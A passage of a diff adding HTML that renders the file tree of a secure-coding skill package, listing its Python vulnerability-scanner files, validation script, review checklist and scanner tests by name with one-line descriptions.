+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_plaintext_password_storage_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_plaintext_password_storage_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Plaintext Password Storage (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_plaintext_sensitive_data_at_rest_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_plaintext_sensitive_data_at_rest_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Plaintext Sensitive Data At Rest (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_predictable_session_token_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_predictable_session_token_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Predictable Session Token (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_secrets_in_log_output_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_secrets_in_log_output_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Secrets In Log Output (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_sensitive_error_disclosure_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_sensitive_error_disclosure_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Sensitive Error Disclosure (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_sql_string_concatenation_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_sql_string_concatenation_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: SQL string concatenation (Python AST + catalog).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_toctou_outside_lock_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_toctou_outside_lock_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Toctou Outside Lock (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_unsafe_deserialization_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_unsafe_deserialization_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Unsafe Deserialization (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_unsafe_file_upload_handling_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_unsafe_file_upload_handling_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Unsafe File Upload Handling (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_untrusted_component_sources_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_untrusted_component_sources_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Untrusted Component Sources (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_weak_crypto_algorithms_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_weak_crypto_algorithms_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Weak Crypto Algorithms (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_xxe_unsafe_xml_parser_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_xxe_unsafe_xml_parser_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Xxe Unsafe Xml Parser (python).&quot;&quot;&quot;</span></li>
+</ul></div></details></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/README.md" target="_blank" rel="noopener noreferrer"><strong>README.md</strong></a><span class="file-meta"> → Scanners — abd-secure-code (enterprise)</span></li>
+</ul></div></details></li>
+<li class="file-list__folder"><details class="file-tree__details"><summary class="file-tree__summary"><strong>scripts/</strong><span class="file-meta"> → Build, catalogue, validation, or packaging automation.</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scripts/validate_batch_wiring.py" target="_blank" rel="noopener noreferrer"><strong>validate_batch_wiring.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Validate batch-wiring.json: context paths and fixture files exist under corpus root.&quot;&quot;&quot;</span></li>
+</ul></div></details></li>
+<li class="file-list__folder"><details class="file-tree__details"><summary class="file-tree__summary"><strong>templates/</strong><span class="file-meta"> → Authoring templates and structural skeletons.</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/templates/secure-code-review-checklist.md" target="_blank" rel="noopener noreferrer"><strong>secure-code-review-checklist.md</strong></a><span class="file-meta"> → Secure code review checklist</span></li>
+</ul></div></details></li>
+<li class="file-list__folder"><details class="file-tree__details"><summary class="file-tree__summary"><strong>test/</strong><span class="file-meta"> → Automated tests for the agent or skill package.</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/test/README.md" target="_blank" rel="noopener noreferrer"><strong>README.md</strong></a><span class="file-meta"> → abd-secure-code scanner tests</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/test/scanner_expectations.json" target="_blank" rel="noopener noreferrer"><strong>scanner_expectations.json</strong></a><span class="file-meta"> → &quot;languages&quot;: [&quot;python&quot;, &quot;javascript&quot;, &quot;java&quot;],</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/test/test_scanners.py" target="_blank" rel="noopener noreferrer"><strong>test_scanners.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Regression tests: secure fixtures stay clean; insecure fixtures trigger rule scanners.&quot;&quot;&quot;</span></li>
+</ul></div></details></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/README.md" target="_blank" rel="noopener noreferrer"><strong>README.md</strong></a><span class="file-meta"> → catalogue_summary: &quot;OWASP-aligned secure coding rules and Python, Java, and JavaScript scanners — write security-sensitive production code and prove it with mechanical checks before merge.&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/SKILL.md" target="_blank" rel="noopener noreferrer"><strong>SKILL.md</strong></a><span class="file-meta"> → name: abd-secure-code</span></li>
+</ul>
+</div>
+
+</div>
+</div>
+</div>
+</body>
+</html>
